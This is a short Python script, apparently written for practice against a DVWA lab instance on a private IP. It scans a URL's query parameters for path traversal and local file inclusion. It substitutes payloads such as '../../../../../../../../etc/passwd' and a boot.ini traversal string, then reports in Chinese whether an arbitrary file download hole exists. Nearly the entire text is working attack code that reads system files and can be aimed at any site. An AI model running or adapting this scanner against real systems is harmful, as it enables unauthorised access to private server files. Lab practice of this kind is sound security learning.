#!/usr/bin/env python
# -*- coding: utf-8 -*-
import copy
from urllib import parse
import urllib
import numpy as np
import requests

def url_values_plus(url, vals):
    ret = []
    u = parse.urlparse(url)
    qs = u.query
    pure_url = url.replace('?'+qs, '')
    qs_dict = dict(parse.parse_qsl(qs))
    for val in vals:
        for k in qs_dict.keys():
            tmp_dict = copy.deepcopy(qs_dict)
            tmp_dict[k] = val
            tmp_qs = parse.unquote(parse.urlencode(tmp_dict))
            ret.append(pure_url + "?" + tmp_qs)
    return ret

  
url = "http://192.168.23.141/DVWA-master/vulnerabilities/fi/?page=include.php"
payloads = ('isdjalfjaslijdf','../../../../../../../boot.ini','../../../../../../../../etc/passwd','../../../../../../../../../a')
urls = url_values_plus(url, payloads)
target=[]
wrong_lenth=0
target_lenth=0
for pure_url in urls:
    target.append(pure_url)
num=len(target)//len(payloads)
error_res=""
test_res=""
b=np.array(target)
mulb=b.reshape((len(payloads),num))
headers={
    'Accept': 'text/html, application/xhtml+xml, image/jxr, */*',
    'Referer': 'http://192.168.23.141/DVWA-master/vulnerabilities/fi/?page=include.php',
    'Accept-Language': 'zh-CN',
    'Host': '192.168.23.141',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko Core/1.63.5478.400 QQBrowser/10.1.1550.400',
    'Cookie': 'security=impossible; PHPSESSID=2aj1ptkrbj5t9s1gk31u9la846',
    'Connection': 'close'
}
for position in range(0,num):
    for paynum in range(0,len(mulb[:,position])):
        if paynum==0:
            res0=requests.get(url=mulb[paynum,position],headers=headers)
            res0.encoding='utf-8'
            error_res=res0.text.replace(" ","")
        else:
            res=requests.get(url=mulb[paynum,position])
            res.encoding='utf-8'
            test_res=res.text.replace(" ","")
            if test_res!=error_res:
                print("存在任意文件下载漏洞")
            else:
                print("不存在任意文件下载漏洞")
                